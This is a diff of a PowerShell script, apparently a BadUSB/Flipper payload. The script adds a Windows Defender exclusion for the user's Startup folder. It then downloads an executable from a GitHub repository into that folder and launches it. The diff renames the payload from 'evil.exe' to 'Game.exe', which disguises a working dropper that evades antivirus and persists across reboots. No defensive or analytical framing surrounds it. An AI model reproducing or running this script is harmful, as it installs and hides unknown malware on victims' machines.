@@ -2,8 +2,8 @@ Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Wind
 
 
 
-$url = "https://github.com/knoxoxen/flipperstuffs/raw/main/evil.exe"
-$destination = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe"
+$url = "https://github.com/knoxoxen/flipperstuffs/raw/main/Game.exe"
+$destination = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Game.exe"
 Invoke-WebRequest -Uri $url -OutFile $destination
 
 
@@ -14,5 +14,5 @@ Invoke-WebRequest -Uri $url -OutFile $destination
 #Expand-Archive -Path $zipPath -DestinationPath $extractPath -F
 
 #Run the EXE file:
-$exePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe"
+$exePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Game.exe"
 Start-Process -FilePath $exePath
